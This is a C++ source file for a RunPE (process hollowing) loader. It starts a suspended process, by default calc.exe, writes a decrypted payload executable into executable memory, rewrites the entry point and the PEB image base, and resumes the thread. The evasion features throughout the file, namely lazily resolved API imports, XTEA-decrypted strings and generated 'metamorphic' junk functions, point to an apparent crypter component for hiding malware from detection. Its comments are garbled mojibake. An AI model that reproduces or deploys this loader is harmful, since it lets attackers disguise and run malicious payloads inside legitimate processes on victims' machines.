#include "run_pe.h"
#include "peconv.h"

#include "../../modules/lazy_importer/lazy_importer.hpp"
#include "../../modules/modules.h"
#include "../../modules/data_crypt_string.h"

#include "../../modules/metamorph_code/config.h"
#include "../../modules/metamorph_code/boost/preprocessor/repetition/repeat_from_to.hpp"

#include <boost/preprocessor/cat.hpp>
#include <boost/preprocessor/repetition/repeat_from_to.hpp>

using namespace peconv;

//������� ������������ ������
void str_to_decrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key)
{

	//��������� ������ ������ �� 8:
	while (!!(size_str % 8)) {
		size_str++;
	}
	//����������� ������
	Xtea3_Data_Crypt((char*)(str_to_crypt), size_str, 0, (uint32_t*)&magic_key);
}

//������� ��������� ������
void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key)
{

	//��������� ������ ������ �� 8:
	while (!!(size_str % 8)) {
		size_str++;
	}

	//�������� ������
	//XTEA_encrypt((uint32_t*)str_to_crypt, size_str, key, size_key);
	Xtea3_Data_Crypt((char*)(str_to_crypt), size_str, 1, key);
}


bool create_suspended_process(uintptr_t base, IN LPSTR path, OUT PROCESS_INFORMATION &pi)
{
	STARTUPINFOA si;
    memset(&si, 0, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!LI_GET(base, CreateProcessA)(
            NULL,
            path,
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            FALSE, //bInheritHandles
            CREATE_SUSPENDED, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, const size_t buffer_size)
{
    memset(buffer, 0, buffer_size);
    if (!ReadProcessMemory(hProcess, LPVOID(remote_addr), buffer, buffer_size, NULL)) {
        printf("[ERROR] Cannot read from the remote memory!\n");
        return false;
    }
    return true;
}

BOOL update_remote_entry_point(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va, bool is32bit)
{
#ifdef _DEBUG
    printf("Writing new EP: %x\n", entry_point_va);
#endif
#if defined(_WIN64)
    if (is32bit) {
        // The target is a 32 bit executable while the loader is 64bit,
        // so, in order to access the target we must use Wow64 versions of the functions:

        // 1. Get initial context of the target:
        WOW64_CONTEXT context = { 0 };
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            return FALSE;
        }
        // 2. Set the new Entry Point in the context:
        context.Eax = static_cast<DWORD>(entry_point_va);

        // 3. Set the changed context into the target:
        return Wow64SetThreadContext(pi.hThread, &context);
    }
#endif
    // 1. Get initial context of the target:
    CONTEXT context = { 0 };
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return FALSE;
    }
    // 2. Set the new Entry Point in the context:
#if defined(_WIN64)
    context.Rcx = entry_point_va;
#else
    context.Eax = static_cast<DWORD>(entry_point_va);
#endif
    // 3. Set the changed context into the target:
    return SetThreadContext(pi.hThread, &context);
}

ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &pi, bool is32bit)
{
    BOOL is_ok = FALSE;
#if defined(_WIN64)
    if (is32bit) {
        //get initial context of the target:
        WOW64_CONTEXT context;
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            printf("Wow64 cannot get context!\n");
            return 0;
        }
        //get remote PEB from the context
        return static_cast<ULONGLONG>(context.Ebx);
    }
#endif
    ULONGLONG PEB_addr = 0;
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return 0;
    }
#if defined(_WIN64)
    PEB_addr = context.Rdx;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}

inline ULONGLONG get_img_base_peb_offset(bool is32bit)
{
/*
We calculate this offset in relation to PEB,
that is defined in the following way
(source "ntddk.h"):

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace; // size: 1
    BOOLEAN ReadImageFileExecOptions; // size : 1
    BOOLEAN BeingDebugged; // size : 1
    BOOLEAN SpareBool; // size : 1
                    // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
    HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit
                   
    PVOID ImageBaseAddress;
    [...]
    */
    ULONGLONG img_base_offset = is32bit ? 
        sizeof(DWORD) * 2
        : sizeof(ULONGLONG) * 2;

    return img_base_offset;
}

bool redirect_to_payload(uintptr_t base, BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, bool is32bit)
{
    //1. Calculate VA of the payload's EntryPoint
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    //2. Write the new Entry Point into context of the remote process:
    if (update_remote_entry_point(pi, ep_va, is32bit) == FALSE) {
        printf("Cannot update remote EP!\n");
        return false;
    }
    //3. Get access to the remote PEB:
    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi, is32bit);
    if (!remote_peb_addr) {
        printf("Failed getting remote PEB address!\n");
        return false;
    }
    // get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + get_img_base_peb_offset(is32bit));
    //calculate size of the field (depends on architecture):
    const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

    SIZE_T written = 0;
    //4. Write the payload's ImageBase into remote process' PEB:
    if (!LI_GET (base, WriteProcessMemory)(pi.hProcess, remote_img_base, 
        &load_base, img_base_size, 
        &written)) 
    {
        printf("Cannot update ImageBaseAddress!\n");
        return false;
    }
    return true;
}

bool _run_pe(uintptr_t base, BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi, bool is32bit)
{
    if (loaded_pe == NULL) return false;

    //1. Allocate memory for the payload in the remote process:
    LPVOID remoteBase = LI_GET(base, VirtualAllocEx)(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBase == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
#ifdef _DEBUG
    printf("Allocated remote ImageBase: %p size: %lx\n", remoteBase, static_cast<ULONG>(payloadImageSize));
#endif
    //2. Relocate the payload (local copy) to the Remote Base:
    if (!relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteBase)) {
        printf("Could not relocate the module!\n");
        return false;
    }
    //3. Guarantee that the subsystem of the payload is GUI:
    set_subsystem(loaded_pe, IMAGE_SUBSYSTEM_WINDOWS_GUI);

    //4. Update the image base of the payload (local copy) to the Remote Base:
    update_image_base(loaded_pe, (ULONGLONG) remoteBase);

#ifdef _DEBUG
    printf("Writing to remote process...\n");
#endif
    //5. Write the payload to the remote process, at the Remote Base:
    SIZE_T written = 0;
    if (!LI_GET(base, WriteProcessMemory)(pi.hProcess, remoteBase, loaded_pe, payloadImageSize, &written)) {
        return false;
    }
#ifdef _DEBUG
    printf("Loaded at: %p\n", loaded_pe);
#endif
    //6. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
    if (!redirect_to_payload(base,loaded_pe, remoteBase, pi, is32bit)) {
        printf("Redirecting failed!\n");
        return false;
    }
    //7. Resume the thread and let the payload run:
	LI_GET(base, ResumeThread)(pi.hThread);
    return true;
}

bool get_calc_path(LPSTR lpOutPath, DWORD szOutPath, bool is_payload_32b)
{
#if defined(_WIN64)
    if (is_payload_32b) {
        ExpandEnvironmentStrings(L"%SystemRoot%\\SysWoW64\\calc.exe", (LPWSTR)lpOutPath, szOutPath);
        return true;
    }
#endif
    ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe", (LPWSTR)lpOutPath, szOutPath);
    return true;
}

bool run_pe(uintptr_t base, BYTE *loaded_pe, size_t payloadImageSize, LPSTR targetPath)
{

	//������� ���� ��� ����������************************************************************
    #define DECL(z, n, text) BOOST_PP_CAT(text, n) ();
	BOOST_PP_REPEAT_FROM_TO(START_MORPH_CODE, END_MORPH_CODE, DECL, function)
	//������� ���� ��� ����������************************************************************

	//1. Load the payload:
	//size_t payloadImageSize = 0;
	// Load the current executable from the file with the help of libpeconv:
	//BYTE* loaded_pe = load_pe_module(payloadPath, payloadImageSize, false, false);
	
	BYTE *mappedDLL = nullptr;
	size_t V_payloadImageSize = 0;
	if (!IsBadReadPtr(loaded_pe, payloadImageSize)) {
		mappedDLL = load_pe_module(loaded_pe, payloadImageSize, V_payloadImageSize, false, false);
	}
	else {
		std::cerr << "[-] oops, mapping of " << "111" << " is invalid!" << std::endl;
	}
	
	if (!mappedDLL) {
		printf("Loading failed!\n");
		return false;
	}

	// Get the payload's architecture and check if it is compatibile with the loader:
	const WORD payload_arch = get_nt_hdr_architecture(mappedDLL);
	if (payload_arch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payload_arch != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		printf("Not supported paylad architecture!\n");
		return false;
	}
	const bool is32bit_payload = !peconv::is64bit(mappedDLL);
#ifndef _WIN64
	if (!is32bit_payload) {
		printf("Incompatibile payload architecture!\n");
		printf("Only 32 bit payloads can be injected from 32bit loader!\n");
		return false;
	}
#endif
	// 2. Prepare the taget
	// Make target path if none supplied:
	char calc_path[MAX_PATH] = { 0 };
	get_calc_path(calc_path, MAX_PATH, is32bit_payload);
	if (targetPath == NULL) {
		targetPath = calc_path;
	}
	// Create the target process (suspended):
	PROCESS_INFORMATION pi = { 0 };
	bool is_created = create_suspended_process(base,targetPath, pi);
	if (!is_created) {
		printf("Creating target process failed!\n");
		free_pe_buffer(mappedDLL, V_payloadImageSize);
		return false;
	}

	//3. Perform the actual RunPE:
	bool isOk = _run_pe(base,mappedDLL, V_payloadImageSize, pi, is32bit_payload);

	//4. Cleanup:
	free_pe_buffer(mappedDLL, V_payloadImageSize);
	LI_GET(base, CloseHandle)(pi.hThread);
	LI_GET(base, CloseHandle)(pi.hProcess);
	//---
	return isOk;
}